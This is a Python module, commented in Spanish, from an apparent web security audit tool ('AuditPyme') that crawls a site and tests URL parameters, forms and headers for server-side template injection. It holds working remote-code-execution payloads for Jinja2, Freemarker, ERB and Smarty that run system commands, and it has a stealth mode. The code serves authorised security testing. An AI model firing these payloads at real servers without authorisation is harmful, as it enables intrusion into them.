"""
Módulo de detección SSTI — AuditPyme
Server-Side Template Injection en Jinja2, Twig, Smarty, Freemarker, ERB, Mako, Velocity.
"""

import requests
import urllib3
import re
import time
import random
from urllib.parse import urljoin, urlparse, urlencode, parse_qs, urlunparse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
TIMEOUT = 12
UA = "Mozilla/5.0 (compatible; AuditPyme/1.0)"

# Payloads RCE confirmación por motor
SSTI_RCE_PAYLOADS = [
    (
        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
        ["uid=", "gid="],
        "Jinja2 RCE (os.popen)"
    ),
    (
        "{{''.__class__.__mro__[1].__subclasses__()[439]('id',shell=True,stdout=-1).communicate()[0].strip().decode()}}",
        ["uid=", "gid="],
        "Jinja2 RCE (subprocess)"
    ),
    (
        '${"freemarker.template.utility.Execute"?new()("id")}',
        ["uid=", "gid="],
        "Freemarker RCE"
    ),
    (
        "<%= IO.popen('id').read %>",
        ["uid="],
        "ERB RCE"
    ),
    (
        "{php}echo shell_exec('id');{/php}",
        ["uid="],
        "Smarty RCE"
    ),
]


class SSTIScanner:
    def __init__(self, target: str, recon_data: dict = None, stealth: bool = False):
        self.target = target
        self.recon_data = recon_data or {}
        self.findings = []
        self.delay = 1.0 if stealth else 0
        self.session = requests.Session()
        self.session.headers.update({"User-Agent": UA})
        self.session.verify = False
        self._base_urls = self._build_base_urls()
        self._forms = []
        self._params = []
        self._visited = set()

    def scan(self) -> list:
        print(f"\n  [*] Detectando SSTI en: {self.target}")
        for base_url in self._base_urls:
            self._crawl(base_url, depth=2)

        print(f"  [*] {len(self._forms)} formularios, {len(self._params)} URLs con parámetros")
        self._test_params()
        self._test_forms()
        self._test_headers()

        if not self.findings:
            print("  [OK] No se detectó SSTI")
        return self.findings

    # ── Crawler ───────────────────────────────────────────────────────────────

    def _crawl(self, url: str, depth: int):
        if depth == 0 or url in self._visited or len(self._visited) > 40:
            return
        if not any(url.startswith(b) for b in self._base_urls):
            return
        if any(p in url.lower() for p in ("logout", "signout", "delete", "remove")):
            return
        self._visited.add(url)

        try:
            resp = self.session.get(url, timeout=TIMEOUT, allow_redirects=True)
        except Exception:
            return

        for attrs, body in re.findall(r'<form([^>]*)>(.*?)</form>', resp.text, re.IGNORECASE | re.DOTALL):
            action_m = re.search(r'action=["\']?([^"\'> ]+)["\']?', attrs, re.IGNORECASE)
            action = action_m.group(1) if action_m else ""
            form_url = urljoin(url, action) if action and action != "#" else url
            method = "post" if re.search(r'method=["\']?post["\']?', attrs, re.IGNORECASE) else "get"
            fields = {}
            for tag in re.findall(r'<input[^>]+>', body, re.IGNORECASE):
                n = re.search(r'name=["\']([^"\']+)["\']', tag, re.IGNORECASE)
                t = re.search(r'type=["\']([^"\']+)["\']', tag, re.IGNORECASE)
                v = re.search(r'value=["\']([^"\']*)["\']', tag, re.IGNORECASE)
                if n and (not t or t.group(1).lower() not in ("submit", "button", "hidden", "password")):
                    fields[n.group(1)] = v.group(1) if v else "test"
            if fields:
                entry = {"url": form_url, "method": method, "fields": fields}
                if entry not in self._forms:
                    self._forms.append(entry)

        for href in re.findall(r'href=["\']([^"\'#]+)["\']', resp.text, re.IGNORECASE):
            full = urljoin(url, href)
            parsed = urlparse(full)
            if parsed.query and full not in self._visited:
                self._params.append({"url": full, "params": parse_qs(parsed.query), "parsed": parsed})
            if depth > 1 and any(full.startswith(b) for b in self._base_urls) and full not in self._visited:
                self._crawl(full, depth - 1)

    # ── Detección con nonce único para evitar falsos positivos ────────────────

    def _make_probe(self):
        """Genera payload y expected únicos por petición."""
        n1 = random.randint(1000, 9999)
        n2 = random.randint(1000, 9999)
        product = str(n1 * n2)
        payloads = [
            # Jinja2 / Mako / Twig / Pebble
            (f"{{{{{n1}*{n2}}}}}", product, "Jinja2/Twig/Mako"),
            # Freemarker / Mako
            (f"${{{n1}*{n2}}}", product, "Freemarker/Mako"),
            # Smarty
            (f"{{{n1}*{n2}}}", product, "Smarty"),
            # ERB / Ruby
            (f"<%= {n1}*{n2} %>", product, "ERB"),
            # Velocity
            (f"#set($x={n1}*{n2})${{x}}", product, "Velocity"),
        ]
        return payloads

    def _is_evaluated(self, resp_text: str, payload: str, expected: str) -> bool:
        """True si el motor evaluó la expresión (expected en respuesta y payload NO reflejado)."""
        return expected in resp_text and payload not in resp_text

    # ── Test en parámetros URL ────────────────────────────────────────────────

    def _test_params(self):
        for p in self._params[:20]:
            for param in p["params"]:
                for payload, expected, engine in self._make_probe():
                    try:
                        url_parts = list(p["parsed"])
                        new_params = {**{k: v[0] for k, v in p["params"].items()}, param: payload}
                        url_parts[4] = urlencode(new_params)
                        test_url = urlunparse(url_parts)
                        time.sleep(self.delay)
                        resp = self.session.get(test_url, timeout=TIMEOUT)
                        if self._is_evaluated(resp.text, payload, expected):
                            self._report(p["url"], "GET", f"parámetro '{param}'", payload, expected, engine)
                            self._try_rce_param(param, p["parsed"], p["params"])
                            break
                    except Exception:
                        pass

    # ── Test en formularios ───────────────────────────────────────────────────

    def _test_forms(self):
        for form in self._forms[:10]:
            for field in form["fields"]:
                for payload, expected, engine in self._make_probe():
                    data = {**form["fields"], field: payload}
                    try:
                        time.sleep(self.delay)
                        if form["method"] == "post":
                            resp = self.session.post(form["url"], data=data, timeout=TIMEOUT)
                        else:
                            resp = self.session.get(form["url"], params=data, timeout=TIMEOUT)
                        if self._is_evaluated(resp.text, payload, expected):
                            self._report(form["url"], form["method"].upper(),
                                         f"campo de formulario '{field}'", payload, expected, engine)
                            break
                    except Exception:
                        pass

    # ── Test en cabeceras HTTP ────────────────────────────────────────────────

    def _test_headers(self):
        """Prueba SSTI en cabeceras que suelen aparecer en páginas de error."""
        for base_url in self._base_urls:
            for payload, expected, engine in self._make_probe():
                for header in ("User-Agent", "Referer", "X-Forwarded-For", "X-Custom-Header"):
                    try:
                        time.sleep(self.delay)
                        resp = self.session.get(base_url, timeout=TIMEOUT,
                                                headers={header: payload})
                        if self._is_evaluated(resp.text, payload, expected):
                            self._report(base_url, "HEADER", f"cabecera '{header}'",
                                         payload, expected, engine)
                    except Exception:
                        pass

    # ── Confirmación de RCE ───────────────────────────────────────────────────

    def _try_rce_param(self, param, parsed, original_params):
        for payload, signs, label in SSTI_RCE_PAYLOADS:
            try:
                url_parts = list(parsed)
                new_params = {**{k: v[0] for k, v in original_params.items()}, param: payload}
                url_parts[4] = urlencode(new_params)
                rce_url = urlunparse(url_parts)
                time.sleep(self.delay)
                resp = self.session.get(rce_url, timeout=TIMEOUT)
                if any(s in resp.text for s in signs):
                    self._add(
                        "CRITICAL",
                        f"SSTI → RCE confirmado ({label})",
                        f"Ejecución de código remoto confirmada en parámetro '{param}'. "
                        f"Payload: {payload[:100]}. "
                        f"Respuesta contiene: {[s for s in signs if s in resp.text]}",
                        "RCE completo: el atacante puede ejecutar cualquier comando del sistema operativo, "
                        "exfiltrar la base de datos completa, instalar backdoors y pivotar a la red interna.",
                        "Eliminar inmediatamente el uso de render_template_string con input del usuario. "
                        "Usar render_template con archivos de plantilla fijos y pasar los datos como variables."
                    )
                    print(f"  [CRITICAL] SSTI → RCE confirmado: {label}")
                    return
            except Exception:
                pass

    # ── Helpers ───────────────────────────────────────────────────────────────

    def _report(self, url, method, location, payload, expected, engine):
        nombre = f"SSTI en {method} {location}"
        self._add(
            "CRITICAL",
            nombre,
            f"El {location} evaluó '{payload}' → '{expected}'. "
            f"Motor probable: {engine}. URL: {url}",
            "Server-Side Template Injection permite ejecutar código arbitrario en el servidor (RCE). "
            "Un atacante puede leer archivos del sistema, ejecutar comandos y comprometer el servidor.",
            "Nunca renderizar input del usuario directamente con un motor de plantillas. "
            "En Flask/Jinja2: usar render_template() con plantillas fijas y pasar datos como variables, "
            "nunca render_template_string(user_input). En PHP/Twig: escapar con {{ var|e }} o usar autoescape."
        )
        print(f"  [CRITICAL] SSTI — {location}, payload={payload} → {expected} ({engine})")

    def _build_base_urls(self) -> list:
        urls = []
        for host in self.recon_data.get("hosts", []):
            if host["estado"] != "up":
                continue
            for p in host["puertos"]:
                port = p["puerto"]
                svc = p["servicio"].lower()
                if "http" in svc or port in (80, 443, 8080, 8443):
                    proto = "https" if port in (443, 8443) else "http"
                    url = (f"{proto}://{self.target}:{port}"
                           if port not in (80, 443) else f"{proto}://{self.target}")
                    if url not in urls:
                        urls.append(url)
        return urls or [f"https://{self.target}"]

    def _add(self, severidad, nombre, descripcion, impacto, recomendacion):
        for f in self.findings:
            if f["nombre"] == nombre:
                return
        self.findings.append({
            "severidad":     severidad,
            "tipo":          "SSTI",
            "nombre":        nombre,
            "descripcion":   descripcion,
            "impacto":       impacto,
            "recomendacion": recomendacion,
        })
